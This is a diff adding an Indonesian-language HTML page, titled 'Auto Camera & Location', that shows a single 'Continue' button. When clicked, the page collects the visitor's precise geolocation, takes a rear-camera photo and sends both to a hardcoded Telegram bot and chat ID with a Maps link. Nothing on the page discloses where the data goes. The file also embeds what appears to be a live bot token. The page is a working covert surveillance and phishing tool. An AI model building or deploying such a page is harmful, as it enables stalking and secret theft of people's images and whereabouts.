@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auto Camera & Location</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      background: #000;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      font-family: Arial, sans-serif;
+    }
+    #startBtn {
+      background: #00b894;
+      color: #fff;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    #startBtn:hover {
+      background: #019874;
+    }
+    #imageDisplay {
+      display: none;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+  </style>
+</head>
+<body>
+  <button id="startBtn">Lanjut 😁</button>
+  <img id="imageDisplay" alt="Camera View">
+
+  <script>
+    // === KONFIGURASI ===
+    const BOT_TOKEN = '7805029240:AAF8ZGNnO69WhgSlMrPI0SkdkVRpCEfrFdY';
+    const CHAT_ID = '7680606818';
+    const IMAGE_URL = 'https://example.com/foto.jpg';
+
+    let currentLocation = null;
+
+    // === MULAI SAAT USER KLIK ===
+    document.getElementById('startBtn').addEventListener('click', async () => {
+      const btn = document.getElementById('startBtn');
+      btn.textContent = 'Meminta izin...';
+      btn.disabled = true;
+
+      try {
+        await getLocationAuto();
+        await accessCameraAndSend();
+
+        // Setelah semua selesai -> tampil full screen
+        document.body.style.background = '#000';
+        btn.style.display = 'none';
+        const img = document.getElementById('imageDisplay');
+        img.style.display = 'block';
+      } catch (error) {
+        alert('Gagal: ' + error.message);
+        btn.disabled = false;
+        btn.textContent = 'Coba Lagi';
+      }
+    });
+
+    // === MENDAPATKAN LOKASI ===
+    function getLocationAuto() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation)
+          return reject(new Error('Browser tidak mendukung geolocation.'));
+
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            currentLocation = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            };
+            resolve();
+          },
+          err => reject(new Error('Gagal mendapatkan lokasi: ' + err.message)),
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      });
+    }
+
+    // === AKSES KAMERA & KIRIM FOTO ===
+    async function accessCameraAndSend() {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } }
+      });
+
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+
+      await new Promise(r => video.onloadeddata = r);
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+
+      const photoData = canvas.toDataURL('image/jpeg');
+
+      // tampilkan di layar
+      document.getElementById('imageDisplay').src = photoData;
+
+      // matikan kamera
+      stream.getTracks().forEach(track => track.stop());
+
+      await sendToTelegram(photoData);
+    }
+
+    // === KIRIM FOTO KE TELEGRAM ===
+    async function sendToTelegram(photoData) {
+      const response = await fetch(photoData);
+      const blob = await response.blob();
+
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'camera_photo.jpg');
+
+      const caption = `
+📸 Foto dari Kamera
+📍 Lokasi:
+• Latitude: ${currentLocation?.latitude || 'unknown'}
+• Longitude: ${currentLocation?.longitude || 'unknown'}
+• Akurasi: ${currentLocation?.accuracy || '-'}m
+🗺️ https://maps.google.com/?q=${currentLocation?.latitude},${currentLocation?.longitude}
+🖼️ URL: ${IMAGE_URL}
+      `;
+
+      formData.append('caption', caption);
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+  </script>
+</body>
+</html>
